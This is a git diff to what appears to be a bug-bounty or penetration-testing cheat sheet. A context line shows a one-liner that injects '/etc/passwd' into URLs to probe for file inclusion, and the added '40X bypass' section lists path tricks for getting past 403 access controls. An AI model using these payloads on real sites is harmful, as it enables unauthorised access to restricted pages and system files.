@@ -315,5 +315,19 @@ gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%"
 ```
 
 
+###  40X bypass
+
+```bash
+site.com/secret –> HTTP 403 Forbidden
+site.com/SECRET –> HTTP 200 OK
+site.com/secret/ –> HTTP 200 OK
+site.com/secret/. –> HTTP 200 OK
+site.com//secret// –> HTTP 200 OK
+site.com/./secret/.. –> HTTP 200 OK
+site.com/;/secret –> HTTP 200 OK
+site.com/.;/secret –> HTTP 200 OK
+site.com//;//secret –> HTTP 200 OK
+site.com/secret.json –> HTTP 200 OK
+```
 
 
